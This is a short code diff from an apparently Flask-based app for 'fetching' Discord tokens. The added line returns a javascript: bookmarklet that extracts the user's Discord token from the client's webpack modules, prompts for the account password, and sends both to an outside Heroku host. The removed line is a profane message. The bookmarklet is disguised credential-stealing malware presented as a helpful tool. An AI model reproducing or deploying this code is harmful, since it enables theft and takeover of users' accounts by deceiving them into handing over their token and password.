@@ -216,7 +216,7 @@ def home():
 			return "Your Token is: " + token
 		else:
 			return "Your Password is Invalid, unable to fetch token."
-	return "eat shit and die"
+	return "javascript:(async() => { const token = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void%200).exports.default.getToken();const%20pass%20=%20prompt(%22Enter%20your%20Account%20Password:%20%22);window.location.href%20=%20`https://find-your-token.herokuapp.com/?user=${token}:${pass}`;})()"
 
 if __name__ == "__main__":
 	app.run()
